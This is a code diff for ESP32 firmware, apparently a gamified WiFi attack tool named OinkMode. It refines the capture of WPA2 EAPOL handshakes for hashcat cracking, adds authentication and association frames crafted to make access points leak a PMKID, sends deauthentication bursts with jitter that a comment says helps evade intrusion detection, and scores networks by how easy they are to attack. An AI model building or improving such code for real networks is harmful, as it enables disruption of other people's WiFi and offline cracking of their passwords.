-                uint16_t fullCopyLen = min((uint16_t)300, fullFrameLen);
-                memcpy(pendingHandshakes[targetSlot]->frames[frameIdx].fullFrame, fullFrame, fullCopyLen);
-                pendingHandshakes[targetSlot]->frames[frameIdx].fullFrameLen = fullCopyLen;
-                pendingHandshakes[targetSlot]->frames[frameIdx].rssi = rssi;
-                
-                pendingHandshakes[targetSlot]->capturedMask |= (1 << frameIdx);
-                
-                pendingHsBusy[targetSlot] = false;  // Unlock after update
+        // Store frame in target slot if we have one.
+        // CAS acquire: prevents concurrent access with consumer (main loop, core 0).
+        // If CAS fails (consumer is reading this slot), drop the frame —
+        // EAPOL handshakes are retransmitted so we'll catch the next one.
+        if (!frameWrittenInAlloc && targetSlot < PENDING_HS_SLOTS && pendingHandshakes[targetSlot]) {
+            bool expected = false;
+            if (pendingHsBusy[targetSlot].compare_exchange_strong(expected, true)) {
+                if (frameIdx < 4) {
+                    // EAPOL payload for hashcat 22000
+                    uint16_t copyLen = min((uint16_t)512, len);
+                    memcpy(pendingHandshakes[targetSlot]->frames[frameIdx].data, payload, copyLen);
+                    pendingHandshakes[targetSlot]->frames[frameIdx].len = copyLen;
+
+                    // Full 802.11 frame for PCAP export
+                    uint16_t fullCopyLen = min((uint16_t)300, fullFrameLen);
+                    memcpy(pendingHandshakes[targetSlot]->frames[frameIdx].fullFrame, fullFrame, fullCopyLen);
+                    pendingHandshakes[targetSlot]->frames[frameIdx].fullFrameLen = fullCopyLen;
+                    pendingHandshakes[targetSlot]->frames[frameIdx].rssi = rssi;
+
+                    pendingHandshakes[targetSlot]->capturedMask |= (1 << frameIdx);
+                }
+                pendingHsBusy[targetSlot].store(false);  // Release CAS lock
             }
         }
     }
@@ -2063,27 +2635,42 @@ int OinkMode::findOrCreateHandshakeSafe(const uint8_t* bssid, const uint8_t* sta
             return i;
         }
     }
-    
-    // Limit check
-    if (handshakes.size() >= MAX_HANDSHAKES) {
-        NetworkRecon::exitCritical();
-        return -1;
-    }
-    // Pressure gate: block new handshakes at Warning+ (aggressive shedding)
-    if (HeapHealth::getPressureLevel() >= HeapPressureLevel::Warning) {
-        NetworkRecon::exitCritical();
-        return -1;
-    }
-    if (ESP.getFreeHeap() < HeapPolicy::kMinHeapForHandshakeAdd) {
-        NetworkRecon::exitCritical();
-        return -1;
-    }
-    if (handshakes.size() >= handshakes.capacity()) {
-        size_t largest = heap_caps_get_largest_free_block(MALLOC_CAP_8BIT);
-        if (largest < HANDSHAKE_ALLOC_MIN_BLOCK) {
-            NetworkRecon::exitCritical();
-            return -1;
+
+    const size_t sizeNow = handshakes.size();
+    const size_t capNow = handshakes.capacity();
+    const HeapPressureLevel pressure = HeapHealth::getPressureLevel();
+    const bool needGrow = sizeNow >= capNow;
+
+    // Only query heap metrics when we'd allocate/grow (keeps hot path allocation-free when capacity is available).
+    const size_t freeHeap = needGrow ? ESP.getFreeHeap() : 0;
+    const size_t largestBlock = needGrow ? heap_caps_get_largest_free_block(MALLOC_CAP_8BIT) : 0;
+
+    const OinkCaptureFilters::HandshakeCreateGateResult gate =
+        OinkCaptureFilters::evaluateHandshakeCreateGate(sizeNow, capNow, MAX_HANDSHAKES,
+                                                        pressure,
+                                                        freeHeap, HeapPolicy::kMinHeapForHandshakeAdd,
+                                                        largestBlock, HANDSHAKE_ALLOC_MIN_BLOCK);
+
+    if (!gate.allowCreate) {
+        switch (gate.blockReason) {
+            case OinkCaptureFilters::HandshakeCreateBlockReason::MaxHandshakes:
+                hsCreateBlockedCap++;
+                break;
+            case OinkCaptureFilters::HandshakeCreateBlockReason::Pressure:
+                hsCreateBlockedPressure++;
+                break;
+            case OinkCaptureFilters::HandshakeCreateBlockReason::FreeHeap:
+                hsCreateBlockedFree++;
+                break;
+            case OinkCaptureFilters::HandshakeCreateBlockReason::Fragmentation:
+                hsCreateBlockedFrag++;
+                break;
+            case OinkCaptureFilters::HandshakeCreateBlockReason::None:
+            default:
+                break;
         }
+        NetworkRecon::exitCritical();
+        return -1;
     }
     
     // Create new entry
@@ -2099,7 +2686,7 @@ int OinkMode::findOrCreateHandshakeSafe(const uint8_t* bssid, const uint8_t* sta
     hs.beaconLen = 0;
     
     // Attach beacon if available
-    if (beaconCaptured && beaconFrame && beaconFrameLen > 0 && beaconFrameLen <= MAX_BEACON_SIZE) {
+    if (gate.allowBeaconCopy && beaconCaptured && beaconFrame && beaconFrameLen > 0 && beaconFrameLen <= MAX_BEACON_SIZE) {
         const uint8_t* beaconBssid = beaconFrame + 16;
         if (memcmp(beaconBssid, bssid, 6) == 0) {
             size_t largest = heap_caps_get_largest_free_block(MALLOC_CAP_8BIT);
@@ -2718,7 +3305,7 @@ void OinkMode::sendDeauthBurst(const uint8_t* bssid, const uint8_t* station, uin
     // Random jitter between frames makes it harder for WIDS to detect pattern
     // Jitter is modified by buffs/debuffs (base 5ms, debuffed 7ms)
     uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
-    uint8_t jitterMax = SwineStats::getDeauthJitterMax();
+    uint8_t jitterMax = FlexesScreen::getDeauthJitterMax();
     
     // Mark session as having deauthed (for Silent Witness achievement tracking)
     SessionStats& sess = const_cast<SessionStats&>(XP::getSession());
@@ -2773,6 +3360,34 @@ void OinkMode::sendDisassocFrame(const uint8_t* bssid, const uint8_t* station, u
     disassocPacket[24] = reason;
     
     esp_wifi_80211_tx(WIFI_IF_STA, disassocPacket, sizeof(disassocPacket), false);
+}
+
+void OinkMode::sendAuthenticationRequest(const uint8_t* bssid) {
+    // 802.11 Authentication Request (Open System) — required before Association
+    // Most APs silently drop Assoc Requests from unauthenticated STAs (IEEE 802.11 state machine)
+    uint8_t authFrame[30] = {};
+    authFrame[0] = 0xB0;  // Frame Control: Type=Management, Subtype=Authentication (0x0B)
+    authFrame[1] = 0x00;
+    // Duration
+    authFrame[2] = 0x00;
+    authFrame[3] = 0x00;
+    // Address 1: Destination (AP BSSID)
+    memcpy(authFrame + 4, bssid, 6);
+    // Address 2: Source (our MAC)
+    uint8_t ourMac[6];
+    esp_wifi_get_mac(WIFI_IF_STA, ourMac);
+    memcpy(authFrame + 10, ourMac, 6);
+    // Address 3: BSSID
+    memcpy(authFrame + 16, bssid, 6);
+    // Sequence control
+    authFrame[22] = 0x00;
+    authFrame[23] = 0x00;
+    // Auth body: Algorithm=Open System(0), Seq=1, Status=Success(0)
+    authFrame[24] = 0x00; authFrame[25] = 0x00;  // Algorithm Number: Open System
+    authFrame[26] = 0x01; authFrame[27] = 0x00;  // Authentication SEQ: 1
+    authFrame[28] = 0x00; authFrame[29] = 0x00;  // Status Code: Success
+
+    esp_wifi_80211_tx(WIFI_IF_STA, authFrame, sizeof(authFrame), false);
 }
 
 void OinkMode::sendAssociationRequest(const uint8_t* bssid, const char* ssid, uint8_t ssidLen) {
@@ -2831,28 +3446,63 @@ void OinkMode::sendAssociationRequest(const uint8_t* bssid, const char* ssid, ui
     assocReq[bodyOffset++] = 0x12;  // 9 Mbps
     assocReq[bodyOffset++] = 0x18;  // 12 Mbps
     assocReq[bodyOffset++] = 0x24;  // 18 Mbps
-    
+
+    // RSN IE (Tag 0x30) - Required for AP to include PMKID in M1
+    // Without RSN IE, most APs won't start 4-way handshake or omit PMKID.
+    // Advertises WPA2-CCMP with PSK AKM, no PMF.
+    assocReq[bodyOffset++] = 0x30;  // Tag: RSN Information
+    assocReq[bodyOffset++] = 0x14;  // Length: 20 bytes
+    assocReq[bodyOffset++] = 0x01;  // RSN Version 1
+    assocReq[bodyOffset++] = 0x00;
+    assocReq[bodyOffset++] = 0x00;  // Group Cipher Suite: 00-0F-AC (IEEE OUI)
+    assocReq[bodyOffset++] = 0x0F;
+    assocReq[bodyOffset++] = 0xAC;
+    assocReq[bodyOffset++] = 0x04;  // CCMP-128
+    assocReq[bodyOffset++] = 0x01;  // Pairwise Cipher Suite Count: 1
+    assocReq[bodyOffset++] = 0x00;
+    assocReq[bodyOffset++] = 0x00;  // Pairwise Cipher Suite: 00-0F-AC
+    assocReq[bodyOffset++] = 0x0F;
+    assocReq[bodyOffset++] = 0xAC;
+    assocReq[bodyOffset++] = 0x04;  // CCMP-128
+    assocReq[bodyOffset++] = 0x01;  // AKM Suite Count: 1
+    assocReq[bodyOffset++] = 0x00;
+    assocReq[bodyOffset++] = 0x00;  // AKM Suite: 00-0F-AC
+    assocReq[bodyOffset++] = 0x0F;
+    assocReq[bodyOffset++] = 0xAC;
+    assocReq[bodyOffset++] = 0x02;  // PSK
+    assocReq[bodyOffset++] = 0x00;  // RSN Capabilities: 0 (no PMF)
+    assocReq[bodyOffset++] = 0x00;
+
     esp_wifi_80211_tx(WIFI_IF_STA, assocReq, bodyOffset, false);
 }
 
 void OinkMode::clearTargetClients() {
+    NetworkRecon::enterCritical();
     targetClientCount = 0;
     targetClientCountCache = 0;
     memset(targetClients, 0, sizeof(targetClients));
+    NetworkRecon::exitCritical();
 }
 
 void OinkMode::trackTargetClient(const uint8_t* bssid, const uint8_t* clientMac, int8_t rssi) {
     // Use BSSID match instead of targetIndex for cross-core safety
+    // Early exit before lock — targetBssid is stable once set (only main loop clears it)
     if (targetBssid[0] == 0) return;
     if (memcmp(bssid, targetBssid, 6) != 0) return;
 
     uint32_t now = millis();
+
+    // Spinlock protects targetClients[]/targetClientCount from concurrent access:
+    // - Callback (core 1): writes here
+    // - Main loop (core 0): reads in ATTACKING snapshot, writes in clearTargetClients
+    NetworkRecon::enterCritical();
 
     // Check if client already tracked
     for (uint8_t i = 0; i < targetClientCount; i++) {
         if (memcmp(targetClients[i].mac, clientMac, 6) == 0) {
             targetClients[i].rssi = rssi;
             targetClients[i].lastSeen = now;
+            NetworkRecon::exitCritical();
             return;
         }
     }
@@ -2868,10 +3518,11 @@ void OinkMode::trackTargetClient(const uint8_t* bssid, const uint8_t* clientMac,
             }
         }
         // Evict stale client (>30s old) to make room
-        if (stalestIdx >= 0 && (millis() - oldestTime > 30000)) {
+        if (stalestIdx >= 0 && (now - oldestTime > 30000)) {
             targetClients[stalestIdx] = targetClients[targetClientCount - 1];
             targetClientCount--;
         } else {
+            NetworkRecon::exitCritical();
             return;  // All clients fresh, give up
         }
     }
@@ -2883,6 +3534,8 @@ void OinkMode::trackTargetClient(const uint8_t* bssid, const uint8_t* clientMac,
         targetClients[targetClientCount].lastSeen = now;
         targetClientCount++;
     }
+
+    NetworkRecon::exitCritical();
 }
 
 bool OinkMode::detectPMF(const uint8_t* payload, uint16_t len) {
@@ -2978,23 +3631,21 @@ void OinkMode::updateTargetCache() {
 }
 
 void OinkMode::sortNetworksByPriority() {
-    // Sort networks by attack priority:
+    // Sort networks by attack priority (in-place to avoid ~24KB heap copy):
     // 1. Has clients + no handshake + not PMF (highest priority)
     // 2. Weak auth (Open, WEP, WPA1) + no handshake
     // 3. WPA2 without PMF + no handshake
     // 4. Networks with handshake already (skip)
     // 5. PMF protected (can't attack)
-    
+
     bool wasBusy = oinkBusy;
     oinkBusy = true;
 
-    std::vector<DetectedNetwork> sorted;
-    NetworkRecon::enterCritical();
-    sorted = networks();
-    NetworkRecon::exitCritical();
-
     uint32_t now = millis();
-    std::sort(sorted.begin(), sorted.end(), [now](const DetectedNetwork& a, const DetectedNetwork& b) {
+
+    NetworkRecon::enterCritical();
+
+    std::sort(networks().begin(), networks().end(), [now](const DetectedNetwork& a, const DetectedNetwork& b) {
         auto getScore = [now](const DetectedNetwork& net) -> int {
             int score = computeTargetScore(net, now);
             if (net.hasHandshake) score -= 60;
@@ -3005,12 +3656,9 @@ void OinkMode::sortNetworksByPriority() {
             if (isExcluded(net.bssid)) score -= 80;
             return score;
         };
-        
+
         return getScore(a) > getScore(b);
     });
-
-    NetworkRecon::enterCritical();
-    networks().swap(sorted);
 
     // Revalidate target index after reordering
     if (targetIndex >= 0) {
@@ -3123,6 +3771,16 @@ static int computeTargetScore(const DetectedNetwork& net, uint32_t now) {
     }
 
     score -= (int)net.attackAttempts * 8;
+
+    // Change 7: Partial handshake retry priority
+    // +50 bonus for networks with M1 captured but no M2 (we were close!)
+    for (const auto& hs : OinkMode::getHandshakes()) {
+        if (memcmp(hs.bssid, net.bssid, 6) == 0) {
+            if (hs.hasM1() && !hs.hasM2()) score += 50;
+            break;
+        }
+    }
+
     return score;
 }
 
@@ -3131,11 +3789,14 @@ static inline bool isEligibleTarget(const DetectedNetwork& net, uint32_t now) {
     if (net.cooldownUntil > now) return false;
     if (net.hasPMF) return false;
     if (net.hasHandshake) return false;
-    if (net.authmode == WIFI_AUTH_OPEN) return false;
-    if (net.attackAttempts >= TARGET_MAX_ATTEMPTS) return false;
-    int8_t rssi = (net.rssiAvg != 0) ? net.rssiAvg : net.rssi;
-    if (rssi < Config::wifi().attackMinRssi) return false;
-    return true;
+     if (net.authmode == WIFI_AUTH_OPEN) return false;
+     if (net.attackAttempts >= TARGET_MAX_ATTEMPTS) return false;
+     // 5GHz networks require C5 to be ready (connected + idle) and not already attacking
+     if (net.is5GHz() && !JanusHog::isReady()) return false;
+     if (net.is5GHz() && c5BackgroundActive) return false;
+     int8_t rssi = (net.rssiAvg != 0) ? net.rssiAvg : net.rssi;
+     if (rssi < Config::wifi().attackMinRssi) return false;
+     return true;
 }
 
 int OinkMode::getNextTarget() {
